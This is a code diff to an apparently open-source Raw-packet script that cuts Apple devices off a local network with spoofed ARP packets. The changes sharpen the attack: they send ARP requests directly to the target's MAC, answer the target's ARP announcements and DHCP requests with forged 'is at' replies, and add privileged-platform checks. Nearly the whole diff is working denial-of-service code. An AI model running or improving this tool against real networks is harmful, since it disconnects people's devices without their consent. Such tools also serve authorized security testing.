@@ -13,13 +13,11 @@ Copyright 2020, Raw-packet Project
 # region Import
 from raw_packet.Utils.base import Base
 from raw_packet.Utils.utils import Utils
-from raw_packet.Scanners.scanner import Scanner
-from raw_packet.Scanners.arp_scanner import ArpScan
 from raw_packet.Utils.network import RawARP, RawSniff, RawSend
 from raw_packet.Utils.tm import ThreadManager
 from argparse import ArgumentParser, RawDescriptionHelpFormatter
 from time import sleep
-from typing import Union, List, Dict
+from typing import Union, Dict
 # endregion
 
 # region Authorship information
@@ -39,7 +37,7 @@ __script_name__ = 'Disconnect Apple device in local network with ARP packets (ap
 class AppleArpDos:
 
     # region Variables
-    _base: Base = Base()
+    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
     _utils: Utils = Utils()
     _arp: RawARP = RawARP()
     _sniff: RawSniff = RawSniff()
@@ -97,8 +95,8 @@ class AppleArpDos:
             # region Send first Multicast ARP request packets
             sleep(3)
             if not self._quit:
-                self._base.print_warning('Send initial Multicast ARP requests')
-            self._send_arp_requests(count_of_packets=5)
+                self._base.print_warning('Send initial ARP requests')
+            self._send_arp_requests(count_of_packets=10)
             # endregion
 
             # region Wait for completion
@@ -120,7 +118,7 @@ class AppleArpDos:
     def _send_arp_requests(self, count_of_packets: int = 5) -> None:
         random_ip_address: str = self._base.get_random_ip_on_interface(self._your['network-interface'])
         arp_init_request = self._arp.make_request(ethernet_src_mac=self._your['mac-address'],
-                                                  ethernet_dst_mac='33:33:00:00:00:01',
+                                                  ethernet_dst_mac=self._target['mac-address'],
                                                   sender_mac=self._your['mac-address'],
                                                   sender_ip=self._target['ipv4-address'],
                                                   target_mac='00:00:00:00:00:00',
@@ -137,8 +135,10 @@ class AppleArpDos:
                                             target_mac=self._target['mac-address'],
                                             target_ip=self._target['ipv4-address'])
         self._raw_send.send(packet=arp_reply)
-        self._base.print_info('ARP response to: ', self._target['ipv4-address'], ' "' + self._target['ipv4-address'] +
-                              ' is at ' + self._your['mac-address'] + '"')
+        if not self._quit:
+            self._base.print_info('ARP response to: ', self._target['ipv4-address'],
+                                  ' "' + self._target['ipv4-address'] +
+                                  ' is at ' + self._your['mac-address'] + '"')
     # endregion
 
     # region Analyze packet
@@ -148,10 +148,13 @@ class AppleArpDos:
         if 'ARP' in packet.keys():
             if packet['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                     packet['ARP']['target-mac'] == '00:00:00:00:00:00' and \
-                    packet['ARP']['target-ip'] == self._target['ipv4-address']:
-                self._base.print_info('ARP packet from: ', packet['Ethernet']['source'],
-                                      ' "Who has ' + packet['ARP']['target-ip'] +
-                                      '? Tell ' + packet['ARP']['sender-ip'] + '"')
+                    packet['ARP']['sender-mac'] == self._target['mac-address'] and \
+                    packet['ARP']['target-ip'] == self._target['ipv4-address'] and \
+                    packet['ARP']['sender-ip'] == self._target['ipv4-address']:
+                if not self._quit:
+                    self._base.print_info('ARP Announcement for: ',
+                                          packet['ARP']['target-ip'] + ' (' +
+                                          packet['ARP']['sender-ip'] + ')')
                 self._send_arp_reply()
         # endregion
 
@@ -164,8 +167,10 @@ class AppleArpDos:
                 if packet['DHCPv4'][53] == 3:
                     if 50 in packet['DHCPv4'].keys():
                         self._target['ipv4-address'] = str(packet['DHCPv4'][50])
-                        self._base.print_success('DHCPv4 Request from: ', self._target['mac-address'],
-                                                 ' requested ip: ', self._target['ipv4-address'])
+                        self._send_arp_requests(count_of_packets=10)
+                        if not self._quit:
+                            self._base.print_success('DHCPv4 Request from: ', self._target['mac-address'],
+                                                     ' requested ip: ', self._target['ipv4-address'])
         # endregion
     # endregion
 
@@ -187,13 +192,8 @@ class AppleArpDos:
 # region Main function
 def main():
 
-    # region Init Raw-packet classes
-    base: Base = Base()
-    # endregion
-
-    # region Check user and platform
-    base.check_user()
-    base.check_platform(available_platforms=['Linux', 'Darwin', 'Windows'])
+    # region Init Raw-packet Base class
+    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
     # endregion
 
     # region Parse script arguments
@@ -205,8 +205,6 @@ def main():
     parser.add_argument('-i', '--interface', type=str, help='Set interface name for send ARP packets', default=None)
     parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
     parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
-    # parser.add_argument('-n', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection',
-    #                     default=False)
     parser.add_argument('-q', '--quit', action='store_true', help='Minimal output')
     args = parser.parse_args()
     # endregion
@@ -217,13 +215,13 @@ def main():
     # endregion
 
     # region Get listen network interface, your IP and MAC address, first and last IP in local network
-    if args.interface is None:
-        base.print_warning('Please set a network interface for sniffing ARP and DHCP requests ...')
-    listen_network_interface: str = base.network_interface_selection(args.interface)
+    message: str = 'Please select a network interface for DoS Apple devices: '
+    current_network_interface: str = base.network_interface_selection(interface_name=args.interface,
+                                                                      message=message)
     # endregion
 
     # region Start ARP DOS
-    apple_arp_dos: AppleArpDos = AppleArpDos(network_interface=listen_network_interface)
+    apple_arp_dos: AppleArpDos = AppleArpDos(network_interface=current_network_interface)
     apple_arp_dos.start(target_ip_address=args.target_ip,
                         target_mac_address=args.target_mac,
                         quit=args.quit)
